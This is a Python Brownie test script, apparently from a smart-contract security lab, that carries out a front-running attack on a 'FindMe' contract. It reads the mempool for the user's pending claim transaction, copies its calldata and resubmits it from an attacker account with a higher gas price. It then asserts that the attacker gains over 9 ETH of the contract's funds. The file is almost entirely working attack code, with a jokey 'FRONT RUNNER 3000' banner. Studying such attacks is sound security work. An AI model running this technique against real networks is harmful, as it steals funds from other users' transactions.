from web3 import Web3
from brownie import accounts, FindMe

#@pytest.fixture
def test_frontrunning():
    yellow ='\x1b[0;33m'
    green ='\x1b[0;32m'
    red='\x1b[0;31m'
    nocolor='\x1b[0;m'
    print(red,"\r[ * ]\x1b[0;33m 0xm4ud FRONT RUNNER 3000",nocolor)

    [deployer, user ,attacker] = accounts[:3]
    w3 = Web3(Web3.HTTPProvider())
    #2.5 ETH (ETH -> WEI -> Hexdecimal)
    # the evm_setAccountBalance json-rcp call equivalent in hardhat is hardhat_setBalance

    attackerInitialBalance = attacker.balance()
    userInitialBalance = user.balance()
    #Deploy FIndMe
    find_me = FindMe.deploy({'from': deployer, 'value': '10 ether'})
    #Claim Ethereum
    find_me.claim("Ethereum",{'from': user,'required_confs':0})

    #Get pending transactions from MemPool
    def get_pending_transactions(w3):
        ptx = w3.provider.make_request("txpool_content", [])
        ptx_from = ptx['result']['pending']
        return ptx_from

    def find_transaction_by_address(ptx_from, target_address):
        for sender, txs in ptx_from.items():
            for nonce, tx in txs.items():
                if tx['to'].lower() == target_address.lower():
                    return tx
        return None

    w3 = Web3(Web3.HTTPProvider())  
    find_me_address = find_me.address  # Replace with the actual address you're looking for

    while True:
        print("[ + ] First Attempt!")
        ptx_from = get_pending_transactions(w3)
        tx = find_transaction_by_address(ptx_from, find_me_address)

        if tx:
            print(green,"\r[ + ] Found it:", tx['to'])
            break
        else:
            print("Not yet")


    print("\x1b[0;32m[ * ]\x1b[0;m Got TX, $$ Bling Bling $$ time!!")

    print(green,"\r[ + ] TX-input:",nocolor,tx['input'])

    attacker.transfer(to=tx['to'], 
                      data=tx['input'], 
                      gas_price=int(tx['gasPrice'],16)+1, 
                      gas_limit=tx['gas'],
                      required_confs=0
                      )


    w3.provider.make_request("evm_mine", [])

    attackerBalance = attacker.balance()
    assert(userInitialBalance == user.balance())
    assert(attackerBalance > attackerInitialBalance + 9*10**18)
